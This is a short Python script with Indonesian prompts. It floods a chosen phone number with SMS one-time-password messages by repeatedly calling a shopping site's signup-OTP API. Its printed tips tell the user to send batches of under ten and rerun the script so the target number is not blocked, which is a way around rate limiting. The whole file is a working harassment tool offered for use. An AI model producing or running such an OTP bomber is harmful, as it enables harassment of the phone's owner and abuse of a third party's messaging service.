import requests

no = int(input('masukan no target : '))
print('===============================================')
print('jangan lebih dari 10 yah seklai kirim pesan nya \ndi ulang ulang saja \ncontoh : kamu kirim 9 \nterus kamu ulang lagi script nya kirim 9\njangan langsung satu kali kirim lebih dari 10\nbisa kena block nomor targetnya2')
print('===============================================')
jum = int(input('masukan jumlah pesan : '))

json = {'phone' :no}
jumlahpes = 0
for res in range(jum):
    res = requests.post('https://cmsapi.mapclub.com/api/signup-otp',json=json)
    if "ok" in res.text :
        jumlahpes +=1
        print(jumlahpes,'pesan berhasil dikirim')
    else:
        print('maaf ada eror ===>> ', res.text)
